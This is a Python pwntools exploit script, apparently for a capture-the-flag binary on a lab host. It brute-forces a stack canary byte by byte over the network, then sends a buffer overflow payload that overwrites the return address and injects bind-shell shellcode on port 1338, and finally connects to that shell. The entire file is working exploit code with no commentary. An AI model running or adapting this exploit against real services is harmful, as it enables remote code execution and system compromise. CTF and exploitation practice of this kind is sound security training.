#!/usr/bin/env python3
from pwn import *
import time

# Context
context(arch = 'amd64', os = 'linux')


def ifByteFound(ip, payload, byte_):
    io = remote(ip, 1337)
    io.recv()
    io.send(payload)
    try:
        msg = io.recvall()
        if(msg):
            print("-------------------------------------------------")
            print("Success for byte: ", byte_)
            print("-------------------------------------------------")
            return True
    except:
        print("Failed for byte: ", byte_)
    return False


def findCanary(ip, offset):
    canary = b''
    fillups = b'a'*offset
    for length in range(41, 49):
        payload = p32(length)
        payload += fillups
        payload += canary
        for b in range(256):
            pred_byte = p8(b)
            test_payload = payload + pred_byte
            # print("payload: ", test_payload)
            if(ifByteFound(ip, test_payload, b)):
                canary += pred_byte
                break
    print("Canary: ", canary)
    return canary


def main():
    ip = "172.22.0.2"

    # get_shell = shellcraft.cat2(, 1, 30)
    get_shell = shellcraft.bindsh(1338)
    offset = 40

    # payload += asm(get_shell)
    canary = findCanary(ip, offset)
    # canary = b'\x00\x97%?0>\xc7a'
    
    payload = b'\x90'*offset + canary + p64(0x0) + p64(0x401466) + asm(get_shell)
    payload_length = len(payload)
    
    exploit = p32(len(payload)) + payload

    io = remote(ip, 1337)
    io.recv()
    io.sendline(exploit)
    
    # sleep(5)
    
    io1 = remote(ip, 1338)
    # io1.sendline(b'cat flag.txt')
    io1.interactive()
    
    # flag = io1.recv()
    # print(flag)

if __name__ == "__main__":
    main()